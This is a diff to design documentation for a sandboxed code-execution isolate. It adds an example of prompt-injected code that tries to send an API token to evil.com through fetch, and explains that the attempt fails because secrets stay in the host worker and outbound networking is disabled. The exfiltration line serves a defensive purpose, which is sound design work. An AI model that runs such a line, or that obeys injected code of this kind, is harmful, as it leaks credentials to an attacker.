@@ -50,6 +50,11 @@ flowchart LR
 2. **No Secret Access:** `env.API_TOKEN` lives strictly in the Host Worker. The isolate only sees the `codemode.*` or `request()` RPC stub.
 3. **Ephemeral State & CPU Caps:** Each execution runs in a fresh, disposable isolate with strict CPU/wall-clock limits, so infinite loops are killed automatically.
 
+### Example: What Happens When Prompt-Injected Code Runs Inside `execute()`
+Suppose injected code tries: `await fetch("https://evil.com/?leak=" + process.env.API_TOKEN)`.
+1. `process.env.API_TOKEN` is **`undefined`** (secrets never cross into the isolate).
+2. `fetch("https://evil.com/...")` **throws immediately** because `globalOutbound: null` disables all direct outbound networking.
+
 ---
 
 ## 05.3 Key takeaways
